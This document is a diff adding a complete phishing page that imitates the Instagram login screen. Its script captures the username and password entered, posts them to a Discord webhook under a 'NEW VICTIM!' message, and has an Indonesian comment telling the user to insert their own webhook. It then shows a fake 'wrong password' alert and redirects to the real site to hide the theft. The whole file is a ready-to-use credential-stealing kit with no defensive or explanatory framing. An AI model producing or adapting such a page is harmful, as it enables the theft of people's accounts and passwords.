@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            margin-top: 16px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">Instagram</div>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="login()">Login</button>
+        <div class="footer">© 2026 Instagram from Meta</div>
+    </div>
+
+    <script>
+        function login() {
+            let user = document.getElementById('username').value;
+            let pass = document.getElementById('password').value;
+            
+            // GANTI INI DENGAN WEBHOOK DISCORD LO
+            let webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL";
+            
+            fetch(webhook, {
+                method: 'POST',
+                body: JSON.stringify({
+                    content: `🎯 NEW VICTIM!\nUser: ${user}\nPass: ${pass}`
+                }),
+                headers: {'Content-Type': 'application/json'}
+            });
+            
+            alert('Username atau password salah');
+            window.location.href = 'https://instagram.com';
+        }
+    </script>
+</body>
+  </html>
